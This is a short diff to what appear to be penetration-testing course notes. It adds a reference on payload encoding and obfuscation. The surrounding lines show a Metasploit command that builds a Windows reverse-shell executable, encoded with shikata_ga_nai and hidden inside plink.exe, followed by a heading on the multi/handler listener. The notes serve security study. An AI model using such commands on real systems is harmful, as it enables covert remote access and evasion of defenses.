@@ -2669,6 +2669,10 @@ msf5 payload(windows/shell_reverse_tcp) > set LPORT 443
 msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
       #+end_src
       
+**** the encoder, and code obfuscation
+     + ref:
+       - [[./ref/ISC2014-AttackCodeExtraction-final.pdf][obfuscation encode techniques (archived)]]
+      
 *** Metasploit Exploit Multi Handler (PWK p698) (msf multi/handler module)
     + info:
       - the msf *multi/handler* module could handle all msf payloads callback.
